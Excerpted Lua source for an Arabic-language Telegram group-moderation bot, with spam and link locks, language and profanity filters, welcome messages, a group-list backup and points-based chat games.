sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevALS:get(AFS.."ALS:Video:AllRed"..msg.content_.text_))
end
if DevALS:get(AFS.."ALS:File:AllRed"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, DevALS:get(AFS.."ALS:File:AllRed"..msg.content_.text_))
end
if DevALS:get(AFS.."ALS:Voice:AllRed"..msg.content_.text_)  then
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevALS:get(AFS.."ALS:Voice:AllRed"..msg.content_.text_))
end
if DevALS:get(AFS.."ALS:Audio:AllRed"..msg.content_.text_)  then
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevALS:get(AFS.."ALS:Audio:AllRed"..msg.content_.text_))
end
if DevALS:get(AFS.."ALS:Photo:AllRed"..msg.content_.text_)  then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, DevALS:get(AFS.."ALS:Photo:AllRed"..msg.content_.text_))
end
if  DevALS:get(AFS.."ALS:Gif:AllRed"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevALS:get(AFS.."ALS:Gif:AllRed"..msg.content_.text_))
end
if DevALS:get(AFS.."ALS:Stecker:AllRed"..msg.content_.text_) then
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevALS:get(AFS.."ALS:Stecker:AllRed"..msg.content_.text_))
end
if DevALS:get(AFS.."ALS:Text:AllRed"..msg.content_.text_) then
function AFSTeam(extra,result,success)
if result.username_ then username = '[@'..result.username_..']' else username = 'ماكو' end
local edit_msg = DevALS:get(AFS..'ALS:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevALS:get(AFS..'ALS:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = DevALS:get(AFS.."ALS:Text:AllRed"..msg.content_.text_)
local Text = Text:gsub('#username',(username or 'ماكو')) 
local Text = Text:gsub('#name','['..result.first_name_..']')
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',edit_msg)
...
if Type == "keed" and not DevALS:sismember(AFS..'ALS:Tkeed:'..msg.chat_id_, msg.sender_user_id_) then
...
if Type == "mute" and not DevALS:sismember(AFS..'ALS:Muted:'..msg.chat_id_, msg.sender_user_id_) then
DevALS:sadd(AFS..'ALS:Muted:'..msg.chat_id_,msg.sender_user_id_)
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
...
--     Source AFS     --
--       Spam Check       --
if not VipMem(msg) and msg.content_.ID ~= "MessageChatAddMembers" and DevALS:hget(AFS.."ALS:Spam:Group:User"..msg.chat_id_,"Spam:User") then 
if msg.sender_user_id_ ~= AFS then
floods = DevALS:hget(AFS.."ALS:Spam:Group:User"..msg.chat_id_,"Spam:User") or "nil"
Num_Msg_Max = DevALS:hget(AFS.."ALS:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
Time_Spam = DevALS:hget(AFS.."ALS:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 5
local post_count = tonumber(DevALS:get(AFS.."ALS:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_) or 0)
if post_count > tonumber(DevALS:hget(AFS.."ALS:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5) then 
local ch = msg.chat_id_
local type = DevALS:hget(AFS.."ALS:Spam:Group:User"..msg.chat_id_,"Spam:User") 
NotSpam(msg,type)  
end
DevALS:setex(AFS.."ALS:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_, tonumber(DevALS:hget(AFS.."ALS:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 3), post_count+1) 
local edit_id = data.text_ or "nil"  
Num_Msg_Max = 5
if DevALS:hget(AFS.."ALS:Spam:Group:User"..msg.chat_id_,"Num:Spam") then
Num_Msg_Max = DevALS:hget(AFS.."ALS:Spam:Group:User"..msg.chat_id_,"Num:Spam") 
end
if DevALS:hget(AFS.."ALS:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") then
Time_Spam = DevALS:hget(AFS.."ALS:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") 
end 
end
end 
--     Source AFS     --
...
if Constructor(msg) or tonumber(msg.sender_user_id_) == tonumber(AFS) then
DevALS:set(AFS..'ALS:PinnedMsg'..msg.chat_id_,msg.content_.message_id_)
else
local pin_id = DevALS:get(AFS..'ALS:PinnedMsg'..msg.chat_id_)
if pin_id and DevALS:get(AFS..'ALS:Lock:Pin'..msg.chat_id_) then
pinmsg(msg.chat_id_,pin_id,0)
end
end
end
if DevALS:get(AFS..'ALS:viewget'..msg.sender_user_id_) then
if not msg.forward_info_ then
DevALS:del(AFS..'ALS:viewget'..msg.sender_user_id_)
else
...
if DevALS:get(AFS..'ALS:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevALS:get(AFS..'ALS:Lock:Photo'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevALS:get(AFS..'ALS:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevALS:get(AFS..'ALS:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevALS:get(AFS..'ALS:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevALS:get(AFS..'ALS:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevALS:get(AFS..'ALS:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevALS:get(AFS..'ALS:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
...
if DevALS:get(AFS..'ALS:Lock:Markdown'..msg.chat_id_) then
if not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
...
if DevALS:get(AFS..'ALS:Lock:Document'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
...
if not VipMem(msg) then
if DevALS:get(AFS..'ALS:Lock:Inline'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
--     Source AFS     --
...
elseif msg.content_.ID == "MessageSticker" then
if not VipMem(msg) then
if DevALS:get(AFS..'ALS:Lock:Stickers'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
...
if DevALS:get(AFS..'ALS:Groups:Welcomes'..msg.chat_id_) then
Welcomes = DevALS:get(AFS..'ALS:Groups:Welcomes'..msg.chat_id_)
else
Welcomes = '• نورت حبي \n• firstname \n• @username'
end
...
if DevALS:get(AFS.."ALS:Lock:Welcome"..msg.chat_id_) then
getUser(msg.sender_user_id_,get_welcome)
end
--     Source AFS     --
--      New User Add      --
elseif msg.content_.ID == "MessageChatAddMembers" then
if not DevALS:get(AFS..'ALS:Lock:BotWelcome') then 
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = AFS,offset_ = 0,limit_ = 1},function(extra,ALS,success) 
for i=0,#msg.content_.members_ do    
BotWelcome = msg.content_.members_[i].id_    
if BotWelcome and BotWelcome == tonumber(AFS) then 
if DevALS:sismember(AFS..'ALS:Groups',msg.chat_id_) then BotText = "مفعله في السابق\n☆︙ارسل ↫ الاوامر واستمتع بالمميزيات" else BotText = "معطله يجب رفعي مشرف\n☆︙بعد ذلك يرجى ارسال امر ↫ تفعيل\n☆︙سيتم رفع الادمنيه والمنشئ تلقائيا" end 
if DevALS:get(AFS.."ALS:Text:BotWelcome") then ALSText = DevALS:get(AFS.."ALS:Text:BotWelcome") else ALSText = "☆︙مرحبا انا بوت اسمي "..NameBot.."\n☆︙حالة الكروب ↫ "..BotText.."\n┉ ┉ ┉ ʙᴀᴅ┉ ┉ ┉ ┉" end 
if DevALS:get(AFS.."ALS:Photo:BotWelcome") then ALSPhoto = DevALS:get(AFS.."ALS:Photo:BotWelcome") elseif ALS.photos_[0] then ALSPhoto = ALS.photos_[0].sizes_[1].photo_.persistent_id_ else ALSPhoto = nil end 
...
if DevALS:get(AFS..'ALS:Lock:Contact'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
--     Source AFS     --
...
if DevALS:get(AFS..'ALS:Lock:Music'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
...
if DevALS:get(AFS..'ALS:Lock:Voice'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
...
if DevALS:get(AFS..'ALS:Lock:Location'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return
end
if msg.content_.caption_ then
...
if DevALS:get(AFS..'ALS:Lock:Videos'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
...
if DevALS:get(AFS..'ALS:Lock:Gifs'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
...
if DevALS:get(AFS..'ALS:Lock:Text'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
...
if not DevALS:get(AFS..'ALS:Spam:Text'..msg.chat_id_) then
sens = 400
else
sens = tonumber(DevALS:get(AFS..'ALS:Spam:Text'..msg.chat_id_))
end
if DevALS:get(AFS..'ALS:Lock:Spam'..msg.chat_id_) and string.len(msg.content_.text_) > (sens) or ctrl_chars > (sens) or real_digits > (sens) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
...
--     Source AFS     --
if DevALS:get(AFS.."ALS:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) then
if text == "الغاء" then
send(msg.chat_id_,msg.id_,"☆︙تم الغاء حفظ الرابط")       
DevALS:del(AFS.."ALS:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) 
return false
end
if msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)") then
local Link = msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)")
DevALS:set(AFS.."ALS:Groups:Links"..msg.chat_id_,Link)
...
if DevALS:get('AFSTeam:'..AFS.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DevALS:del('AFSTeam:'..AFS..'id:user'..msg.chat_id_)  
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم الغاء الامر', 1, 'md')
DevALS:del('AFSTeam:'..AFS.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
return false  end 
DevALS:del('AFSTeam:'..AFS.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = DevALS:get('AFSTeam:'..AFS..'id:user'..msg.chat_id_)  
DevALS:incrby(AFS..'ALS:UsersMsgs'..msg.chat_id_..':'..iduserr,numadded)
Dev_ALS(msg.chat_id_, msg.id_,  1, "☆︙تم اضافة "..numadded..' رساله', 1, 'md')
DevALS:del('AFSTeam:'..AFS..'id:user'..msg.chat_id_) 
end
end
if text and Constructor(msg) then 
if DevALS:get('AFSTeam:'..AFS.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DevALS:del('AFSTeam:'..AFS..'ids:user'..msg.chat_id_)  
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم الغاء الامر', 1, 'md')
DevALS:del('AFSTeam:'..AFS.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
return false  end 
DevALS:del('AFSTeam:'..AFS.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = DevALS:get('AFSTeam:'..AFS..'ids:user'..msg.chat_id_)  
DevALS:incrby(AFS..'ALS:GamesNumber'..msg.chat_id_..iduserr,numadded)  
...
if not DevALS:get(AFS.."ALS:Lock:Fshar"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
...
if DevALS:get(AFS.."ALS:Lock:Farsi"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","☆︙ممنوع التكلم بالغه الفارسيه هنا")  
end end
if text and (text:match("ڬ") or text:match("ٺ") or text:match("چ") or text:match("ڇ") or text:match("ڿ") or text:match("ڀ") or text:match("ڎ") or text:match("ݫ") or text:match("ژ") or text:match("ڟ") or text:match("ݜ") or text:match("ڸ") or text:match("پ") or text:match("۴") or text:match("مک") or text:match("زدن") or text:match("دخترا") or text:match("دیوث") or text:match("کلیپشن") or text:match("خوششون") or text:match("میدا") or text:match("که") or text:match("بدانیم") or text:match("باید") or text:match("زناشویی") or text:match("آموزش") or text:match("راحتی") or text:match("خسته") or text:match("بیام") or text:match("بپوشم") or text:match("كرمه")) then
if DevALS:get(AFS.."ALS:Lock:FarsiBan"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ChatKick(msg.chat_id_, msg.sender_user_id_)
end end 
if text and (text:match("خره بالله") or text:match("خبربك") or text:match("كسدينربك") or text:match("خرب بالله") or text:match("خرب الله") or text:match("خره بربك") or text:match("الله الكواد") or text:match("خره بمحمد") or text:match("كسم الله") or text:match("كسم ربك") or text:match("كسربك") or text:match("كسختالله") or text:match("كسخت الله") or text:match("خره بدينك") or text:match("خرهبدينك") or text:match("كسالله") or text:match("خربالله")) then
if not DevALS:get(AFS.."ALS:Lock:Kfr"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
...
if not DevALS:get(AFS.."ALS:Lock:Taf"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
...
local List = DevALS:smembers(AFS..'ALS:Groups') 
local BotName = (DevALS:get(AFS.."ALS:NameBot") or 'يوكا')
local GetJson = '{"BotId": '..AFS..',"BotName": "'..BotName..'","GroupsList":{'  
for k,v in pairs(List) do 
LinkGroups = DevALS:get(AFS.."ALS:Groups:Links"..v)
Welcomes = DevALS:get(AFS..'ALS:Groups:Welcomes'..v) or ''
Welcomes = Welcomes:gsub('"',"") Welcomes = Welcomes:gsub("'","") Welcomes = Welcomes:gsub(",","") Welcomes = Welcomes:gsub("*","") Welcomes = Welcomes:gsub(";","") Welcomes = Welcomes:gsub("`","") Welcomes = Welcomes:gsub("{","") Welcomes = Welcomes:gsub("}","") 
ALSConstructors = DevALS:smembers(AFS..'ALS:ALSConstructor:'..v)
Constructors = DevALS:smembers(AFS..'ALS:BasicConstructor:'..v)
BasicConstructors = DevALS:smembers(AFS..'ALS:Constructor:'..v)
Managers = DevALS:smembers(AFS..'ALS:Managers:'..v)
Admis = DevALS:smembers(AFS..'ALS:Admins:'..v)
Vips = DevALS:smembers(AFS..'ALS:VipMem:'..v)
if k == 1 then
GetJson = GetJson..'"'..v..'":{'
else
GetJson = GetJson..',"'..v..'":{'
...
GetJson = GetJson..'}}'
local File = io.open('./'..AFS..'.json', "w")
File:write(GetJson)
File:close()
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './'..AFS..'.json', '☆︙يحتوي الملف على ↫ '..#List..' مجموعه',dl_cb, nil)
io.popen('rm -rf ./'..AFS..'.json')
end
...
--     Source AFS     --
if DevALS:get(AFS.."SET:GAME"..msg.chat_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 6 then
Dev_ALS( msg.chat_id_, msg.id_, 1,"☆︙يوجد فقط ( 6 ) اختيارات\n☆︙ارسل اختيارك مره اخرى", 1, "md")    
return false  end 
local GETNUM = DevALS:get(AFS.."GAMES"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
DevALS:del(AFS.."SET:GAME"..msg.chat_id_)   
Dev_ALS( msg.chat_id_, msg.id_, 1,'☆︙*المحيبس باليد رقم* ↫ '..NUM..'\n☆︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*', 1, "md") 
DevALS:incrby(AFS..'ALS:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
...
if DevALS:get(AFS..'DevALS4'..msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_, "☆︙تم الغاء الامر")
DevALS:del(AFS..'DevALS4'..msg.sender_user_id_)
return false  end 
DevALS:del(AFS..'DevALS4'..msg.sender_user_id_)
local username = string.match(text, "@[%a%d_]+") 
tdcli_function({ID = "SearchPublicChat",username_ = username},function(arg,data) 
if data and data.message_ and data.message_ == "USERNAME_NOT_OCCUPIED" then 
send(msg.chat_id_, msg.id_, '☆︙المعرف ماكو فيه قناة')
return false  end
...
DevALS:set(AFS..'ALS:ChId',data.id_)
else
...
--     Source AFS     --
if DevALS:get(AFS.."ALS:DevText"..msg.chat_id_..":" .. msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
DevALS:del(AFS.."ALS:DevText"..msg.chat_id_..":" .. msg.sender_user_id_)
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم الغاء الامر', 1, 'md')
return false 
end 
DevALS:del(AFS.."ALS:DevText"..msg.chat_id_..":" .. msg.sender_user_id_)
local DevText = msg.content_.text_:match("(.*)")
DevALS:set(AFS.."DevText", DevText)
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم حفظ كليشة المطور", 1, "md")
end
if DevALS:get(AFS..'ALS:NameBot'..msg.sender_user_id_) == 'msg' then
if text and text:match("^الغاء$") then 
DevALS:del(AFS..'ALS:NameBot'..msg.sender_user_id_)
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم الغاء الامر', 1, 'md')
return false 
end 
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم حفظ اسم البوت ', 1, 'html')
DevALS:del(AFS..'ALS:NameBot'..msg.sender_user_id_)
DevALS:set(AFS..'ALS:NameBot', text)
return false 
end
--     Source AFS     --
if msg.chat_id_ then
...
NameBot = (DevALS:get(AFS..'ALS:NameBot') or 'يوكا')
local AFSTeam = {' كول حبيبي ؟ اني '..NameBot..' ',' وياك القميل '..NameBot..' ',' اسمي القميل '..NameBot..' '}
DevALS2 = math.random(#AFSTeam) 
Dev_ALS(msg.chat_id_, msg.id_, 1, AFSTeam[DevALS2] , 1, 'html') 
return false
end
if text == 'اسم البوت' or text == 'البوت شنو اسمه' or text == 'شسمه البوت' or text == 'البوت شسمه' then
NameBot = (DevALS:get(AFS..'ALS:NameBot') or 'يوكا') 
local AFSTeam = {"اسمي القميل "..NameBot.." "} 
DevALS2 = math.random(#AFSTeam) 
Dev_ALS(msg.chat_id_, msg.id_, 1, AFSTeam[DevALS2] , 1, 'html') 
return false
end
if text and text == (DevALS:get(AFS..'ALS:NameBot') or 'يوكا') then 
NameBot = (DevALS:get(AFS..'ALS:NameBot') or 'يوكا')
...
if tonumber((DevALS:get(AFS..'ALS:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
Dev_ALS(msg.chat_id_, msg.id_, 1,'☆︙لم تربح اي نقطه\n☆︙ارسل ↫ الالعاب للعب', 1, 'md')
else 
Dev_ALS(msg.chat_id_, msg.id_, 1,'☆︙عدد النقاط التي ربحتها ↫ '..(DevALS:get(AFS..'ALS:GamesNumber'..msg.chat_id_..msg.sender_user_id_)), 1, 'md')
end
end
if text ==  'حذف نقاطي' and ChCheck(msg) or text ==  'مسح نقاطي' and ChCheck(msg) then DevALS:del(AFS..'ALS:GamesNumber'..msg.chat_id_..msg.sender_user_id_) Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم حذف جميع نقاطك', 1, 'md') end
--     Source AFS     --
if text == 'سمايلات' and ChCheck(msg) or text == 'السمايلات' and ChCheck(msg) or text == '↫ سمايلات ☆' and ChCheck(msg) then
if not DevALS:get(AFS..'ALS:Lock:Games'..msg.chat_id_) then
DevALS2 = {'🍏','🍎','🍐','🍊','🍋','🍌','🍉','🍇','🍓','🍈','🍒','🍑','🍍','🥥','🥝','🍅','🍆','🥑','🥦','🥒','🌶','🌽','🥕','🥔','🍠','🥐','🍞','🥖','🥨','🧀','🥚','🍳','🥞','🥓','🥩','🍗','🍖','🌭','🍔','🍟','🍕','🥪','🥙','🍼','☕️','🍵','🥤','🍶','🍺','🍻','🏀','⚽️','🏈','⚾️','🎾','🏐','🏉','🎱','🏓','🏸','🥅','🎰','🎮','🎳','🎯','🏆','🎻','🎸','🎺','🥁','🎹','🎼','🎧','🎤','🎬','🎨','🎭','🎪','🛎','📤','🎗','🏵','🎖','🏆','🥌','??','🚕','🚗','🚙','🚌','🚎','🏎','🚓','🚑','🚚','🚛','🚜','🇮🇶','⚔️','🛡','🔮','🌡','💣','⏱','🛢','📓','📗','📂','📅','📪','📫','📬','📭','⏰','📺','🎚','☎️','📡'}
name = DevALS2[math.random(#DevALS2)]
DevALS:set(AFS..'ALS:GameNum'..msg.chat_id_,name)
DevALS:del(AFS..'ALS:Games:Ids'..msg.chat_id_)
...
name = string.gsub(name,'🎚','🎚')
name = string.gsub(name,'☎️','☎️')
AFSTeam = '☆︙اول واحد يدز هذا السمايل يربح ↫ '..name
Dev_ALS(msg.chat_id_, msg.id_, 1,AFSTeam, 1, 'md')
return false
end end
if text == DevALS:get(AFS..'ALS:GameNum'..msg.chat_id_) and not DevALS:get(AFS..'ALS:Games:Ids'..msg.chat_id_) then
if not DevALS:get(AFS..'ALS:Games:Ids'..msg.chat_id_) then 
AFSTeam = '☆︙مبروك لقد ربحت في اللعبه \n☆︙ارسل ↫ سمايلات للعب مره اخرى'
Dev_ALS(msg.chat_id_, msg.id_, 1,AFSTeam, 1, 'md')
DevALS:incrby(AFS..'ALS:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevALS:set(AFS..'ALS:Games:Ids'..msg.chat_id_,true)
end
...
AFSTeam = '☆︙اول واحد يرتبها يربح ↫ '..name
Dev_ALS(msg.chat_id_, msg.id_, 1,AFSTeam, 1, 'md')
return false
end end
if text == DevALS:get(AFS..'ALS:GameNum'..msg.chat_id_) and not DevALS:get(AFS..'ALS:Games:Ids'..msg.chat_id_) then
...
if not DevALS:get(AFS..'ALS:Lock:Games'..msg.chat_id_) then
Num = math.random(1,6)
DevALS:set(AFS.."GAMES"..msg.chat_id_,Num) 
TEST = [[
➀     ➁     ➂     ➃     ➄     ➅
↓     ↓     ↓     ↓     ↓     ↓
👊 ‹› 👊🏻 ‹› 👊🏼 ‹› 👊🏽 ‹› 👊🏾 ‹› 👊🏿
...
DevALS:setex(AFS.."SET:GAME"..msg.chat_id_, 100, true)  
return false  
end end
...
AFSTeam = '☆︙اول واحد يحلها يربح ↫ '..name
Dev_ALS(msg.chat_id_, msg.id_, 1,AFSTeam, 1, 'md')
return false
end end
if text == DevALS:get(AFS..'ALS:GameNum'..msg.chat_id_) and not DevALS:get(AFS..'ALS:Games:Ids'..msg.chat_id_) then
...
name = DevALS2[math.random(#DevALS2)]
DevALS:set(AFS..'ALS:GameNum2'..msg.chat_id_,name)
DevALS:del(AFS..'ALS:Games:Ids'..msg.chat_id_)
...
AFSTeam = '☆︙ما معنى هذا السمايل :؟ ↫ '..name
Dev_ALS(msg.chat_id_, msg.id_, 1,AFSTeam, 1, 'md')
return false
end end
if text == DevALS:get(AFS..'ALS:GameNum2'..msg.chat_id_) and not DevALS:get(AFS..'ALS:Games:Ids'..msg.chat_id_) then
if not DevALS:get(AFS..'ALS:Games:Ids'..msg.chat_id_) then 
...
name = DevALS2[math.random(#DevALS2)]
DevALS:set(AFS..'ALS:GameNum3'..msg.chat_id_,name)
DevALS:del(AFS..'ALS:Games:Ids'..msg.chat_id_)
...
AFSTeam = '☆︙ما هو عكس كلمة ↫ '..name
Dev_ALS(msg.chat_id_, msg.id_, 1,AFSTeam, 1, 'md')
return false
end end
if text == DevALS:get(AFS..'ALS:GameNum3'..msg.chat_id_) and not DevALS:get(AFS..'ALS:Games:Ids'..msg.chat_id_) then
if not DevALS:get(AFS..'ALS:Games:Ids'..msg.chat_id_) then 
...
DevALS2 = {'😸','☠','🐼','🐇','🌑','🌚','⭐️','📥','⛈','🌥','⛄️','👨‍🔬','👨‍💻','👨‍🔧','👩‍🍳','🧚‍♀','🧚‍♂️','🧝‍♂','🙍‍♂','🧖‍♂','👬','👨‍👨‍👧','🕓','🕤','⌛️','📅','👩‍⚖️','👨‍🎨'};
name = DevALS2[math.random(#DevALS2)]
DevALS:set(AFS..'ALS:GameNum4'..msg.chat_id_,name)
DevALS:del(AFS..'ALS:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'😸','😹😹😹😸😹😹??😹')
name = string.gsub(name,'☠️','💀💀💀☠️💀💀💀💀')
name = string.gsub(name,'🐼','👻👻👻👻👻👻👻🐼')
...
name = string.gsub(name,'👩‍⚖️','👨‍⚖️👨‍⚖️👨‍⚖️👨‍⚖️👨‍⚖️👩‍⚖️👨‍⚖️👨‍⚖️')
name = string.gsub(name,'👨‍🎨','👩‍🎨👩‍🎨👨‍🎨👩‍🎨👩‍🎨👩‍🎨👩‍🎨👩‍🎨')
AFSTeam = '☆︙اول واحد يطلع المختلف يربح\n{'..name..'} '
Dev_ALS(msg.chat_id_, msg.id_, 1,AFSTeam, 1, 'md')
return false
end end
if text == DevALS:get(AFS..'ALS:GameNum4'..msg.chat_id_) and not DevALS:get(AFS..'ALS:Games:Ids'..msg.chat_id_) then
if not DevALS:get(AFS..'ALS:Games:Ids'..msg.chat_id_) then 
...
name = DevALS2[math.random(#DevALS2)]
DevALS:set(AFS..'ALS:GameNum5'..msg.chat_id_,name)
DevALS:del(AFS..'ALS:Games:Ids'..msg.chat_id_)
...
AFSTeam = '☆︙اكمل المثال التالي ↫ ['..name..']'
Dev_ALS(msg.chat_id_, msg.id_, 1,AFSTeam, 1, 'md')
return false
end end
if text == DevALS:get(AFS..'ALS:GameNum5'..msg.chat_id_) then
if not DevALS:get(AFS..'ALS:Games:Ids'..msg.chat_id_) then 
DevALS:incrby(AFS..'ALS:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevALS:del(AFS..'ALS:GameNum5'..msg.chat_id_)
...
name = DevALS2[math.random(#DevALS2)]
DevALS:set(AFS..'ALS:GameNum6'..msg.chat_id_,name)
DevALS:del(AFS..'ALS:Games:Ids'..msg.chat_id_)
...
AFSTeam = '☆︙اكمل المعادله التاليه ↫ ⤈\n{'..name..'} '
Dev_ALS(msg.chat_id_, msg.id_, 1,AFSTeam, 1, 'md')
return false
end end
if text == DevALS:get(AFS..'ALS:GameNum6'..msg.chat_id_) then
if not DevALS:get(AFS..'ALS:Games:Ids'..msg.chat_id_) then 
DevALS:incrby(AFS..'ALS:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevALS:del(AFS..'ALS:GameNum6'..msg.chat_id_)
...
name = DevALS2[math.random(#DevALS2)]
DevALS:set(AFS..'ALS:GameNum7'..msg.chat_id_,name)
DevALS:del(AFS..'ALS:Games:Ids'..msg.chat_id_)
...
AFSTeam = '☆︙ما معنى كلمة ↫ '..name
Dev_ALS(msg.chat_id_, msg.id_, 1,AFSTeam, 1, 'md')
return false
end end
if text == DevALS:get(AFS..'ALS:GameNum7'..msg.chat_id_) then
if not DevALS:get(AFS..'ALS:Games:Ids'..msg.chat_id_) then 
DevALS:incrby(AFS..'ALS:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevALS:del(AFS..'ALS:GameNum7'..msg.chat_id_)
...
name = DevALS2[math.random(#DevALS2)]
DevALS:set(AFS..'ALS:GameNum8'..msg.chat_id_,name)
DevALS:del(AFS..'ALS:Games:Ids'..msg.chat_id_)
...
if text == DevALS:get(AFS..'ALS:GameNum8'..msg.chat_id_) then
